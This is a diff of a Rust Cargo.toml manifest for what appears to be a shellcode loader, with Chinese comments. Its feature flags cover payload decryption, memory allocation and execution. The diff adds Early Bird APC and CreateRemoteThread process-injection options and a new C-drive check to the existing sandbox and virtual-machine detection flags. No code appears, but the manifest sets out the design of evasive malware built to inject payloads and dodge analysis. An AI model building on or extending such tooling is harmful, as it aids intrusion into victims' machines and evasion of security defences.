@@ -8,7 +8,6 @@ edition = "2021"
 [dependencies]
 tempfile = "3.10.1"
 base64 = "0.21.5"
-winapi = { version = "0.3.9", features = ["winhttp", "winuser", "memoryapi", "synchapi", "handleapi", "errhandlingapi", "processthreadsapi", "debugapi", "sysinfoapi", "fileapi", "winbase", "iphlpapi", "ntdef", "ifdef", "winsock2", "iptypes", "ws2def", "processenv","debugapi"] }
 windows-sys = { version = "0.42.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader"] }
 winreg = "0.52.0"
 uuid = { version = "1.0", features = ["v4"] }
@@ -25,7 +24,6 @@ typenum = "1.16"
 embed-resource = "1.8.0"
 
 [features]
-
 default = ["decrypt_ipv4", "alloc_mem_va", "run_create_thread"]
 
 # 解密算法特性开关
@@ -42,15 +40,21 @@ alloc_mem_global = []
 alloc_mem_local = []
 
 # 注入/执行方式
-run_create_thread = []
-run_enum_ui = []
-run_gdi_families = []
+pattern1 = []
+pattern2 = []
+pattern3 = []
+run_create_thread = ["pattern1"]
+run_enum_ui = ["pattern1"]
+run_gdi_families = ["pattern1"]
+run_early_bird_apc = ["pattern2"]         # Early Bird APC 注入
+run_create_remote_thread = ["pattern3"]    # CreateRemoteThread 远程注入
 
 # 虚拟机/沙箱检测特性
 sandbox = []
 vm_check_tick = ["sandbox"]
 vm_check_mouse = ["sandbox"]
 vm_check_desktop_files = ["sandbox"]
+vm_check_c_drive = ["sandbox"]
 
 with_forgery = []
 
